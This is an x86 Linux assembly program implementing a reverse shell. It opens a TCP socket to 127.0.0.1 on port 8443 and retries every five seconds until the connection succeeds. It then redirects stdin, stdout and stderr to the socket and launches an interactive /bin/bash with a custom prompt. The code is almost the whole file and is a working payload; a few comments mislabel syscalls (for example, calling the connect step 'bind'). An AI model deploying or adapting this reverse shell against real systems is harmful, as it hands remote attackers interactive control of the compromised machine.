global _start

section .data
	wait_str db 10,"Wait 5 seconds...",0
	wait_str_len equ $ - wait_str
	shell db "/bin/bash",0
	ps1 db 'PS1=\e[0;31mf\e[0;32ma\e[0;33mn\e[0;34mc\e[0;35my\e[m \$',0
	term db "TERM=xterm-256color",0
	envs dd ps1,term,0
	arg1 db "-i",0
	arg2 db "--noprofile",0
	arg3 db "--norc",0
	args dd shell,arg2,arg3,arg1,0

section .text

_start:

; Creating a socket

	; move decimal 102 in eax - socketcall syscall
	xor eax, eax
	mov al, 0x66    ;converted to hex
	; set the call argument to 1 - SOCKET syscall
	xor ebx, ebx
	mov bl, 0x1
	; push value of protocol, type and domain on stack - socket syscall
	; int socket(int domain, int type, int protocol);
	; arguments pushed in reverse order
	xor ecx, ecx
	push ecx        ; Protocol = 0
	push 0x1        ; Type = 1 (SOCK_STREAM)
	push 0x2        ; Domain = 2 (AF_INET)
	; set value of ecx to point to top of stack - points to block of arguments for socketcall syscall
	mov ecx, esp
	int 0x80

; Connect socket to remote system
	; save return value of socket syscall - socket file descriptor
	 xor edx, edx
	mov edx, eax
	; move decimal 102 in eax - socketcall syscall
	 mov al, 0x66    ;converted to hex
	; set the call argument to 3 - connect syscall
	mov bl, 0x3
	; push sockaddr structure on the stack
	; struct sockaddr {
	;       sa_family_t sa_family;
	;       char        sa_data[14];
	;       }
	xor ecx, ecx
	;push 0x087cc94e         ; s_addr = 127.0.0.1
	push 0x0100007f
	push word 0xfb20        ; port = 8443
	push word 0x2           ; family = AF_INET
	mov esi, esp            ; save address of sockaddr struct
	; push values of addrlen, addr and sockfd on the stack
	; bind(host_sockid, (struct sockaddr*) &addr, sizeof(addr));
	push 0x10               ; strlen =16
	push esi                ; address of sockaddr structure
	push edx                ; file descriptor returned from socket syscall
	; set value of ecx to point to top of stack - points to block of arguments for bind syscall
	mov ecx, esp
	int 0x80

	; If execve != 0 then wait 5 secs
	cmp eax, 0
	jne wait_sec
	jmp connected

wait_sec:
	mov eax, 4
	mov ebx, 1
	mov ecx, wait_str
	mov edx, wait_str_len
	int 0x80

	mov eax, 0x0D
	push byte 0x00
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80

	mov esi, eax
	add esi, 5
L2:
	mov eax, 0x0D
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80

	cmp eax, esi
	jl L2

	jmp _start

connected:
; Duplicate file descriptors

	; push arguments for dup2 syscall
	; int dup2(int oldfd, int newfd);

	; dup2 syscall - setting STDIN;
	mov al, 0x3f            ; move decimal 63; coverted to hex - dup2 syscall
	mov ebx, edx            ; move reture value of sockfd (return value of socket syscall) in ebx
	xor ecx, ecx
	int 0x80
	; dup2 syscall - setting STDOUT
	mov al, 0x3f            ; move decimal 63; coverted to hex - dup2 syscall
	mov cl, 0x1
	int 0x80
	; dup2 syscall - setting STDERR
	mov al, 0x3f            ; move decimal 63; coverted to hex - dup2 syscall
	mov cl, 0x2
	int 0x80

; Execute /bin/sh
	; exeve syscall
	mov al, 0xb
	; int execve(const char *pathname, char *const argv[], char *const envp[]);
	xor ebx, ebx
	push ebx                ; Null
	mov ebx, shell
	xor ecx, ecx
	mov ecx, args
	xor edx, edx
	mov edx, envs ; edx = [ps1]
	int 0x80
